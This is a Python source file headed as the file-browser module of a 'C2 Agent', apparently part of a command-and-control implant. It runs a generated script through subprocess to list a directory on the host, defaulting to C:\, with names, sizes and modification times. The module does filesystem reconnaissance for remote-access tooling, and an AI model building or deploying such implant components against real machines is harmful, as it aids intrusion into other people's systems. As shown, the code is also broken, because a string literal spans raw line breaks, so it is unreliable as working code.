"""C2 Agent - File Browser"""
import subprocess, sys, os, datetime
def list_files(path="C:\\"):
    try:
        script = f'''
import os, datetime
p = {repr(path)}
if not os.path.exists(p):
    print("[ERROR] Path not found")
    exit(1)
if os.path.isfile(p):
    s = os.stat(p)
    print(f"File: {{os.path.basename(p)}}")
    print(f"Size: {{s.st_size:,}} bytes")
    print(f"Modified: {{datetime.datetime.fromtimestamp(s.st_mtime)}}")
    exit(0)
print(f"📁 {{p}}")
print(f"{{"Name":<40}} {{"Type":<8}} {{"Size":<12}} {{"Modified"}}")
print("-"*80)
items = sorted(os.listdir(p), key=lambda x: (not os.path.isdir(os.path.join(p,x)), x.lower()))
for name in items:
    fp = os.path.join(p, name)
    if os.path.isdir(fp):
        sz = ""
        try: sz = f"{{len(os.listdir(fp))}} items"
        except: sz = "?"
        print(f"{{name:<40}} {{'<DIR>':<8}} {{sz:<12}} {{datetime.datetime.fromtimestamp(os.stat(fp).st_mtime).strftime('%Y-%m-%d %H:%M')}}")
    else:
        s = os.stat(fp)
        print(f"{{name:<40}} {{'':<8}} {{s.st_size:<12,}} {{datetime.datetime.fromtimestamp(s.st_mtime).strftime('%Y-%m-%d %H:%M')}}")
'''
        r = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=30)
        out = r.stdout + ("
[STDERR]
" + r.stderr if r.stderr else "")
        return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}
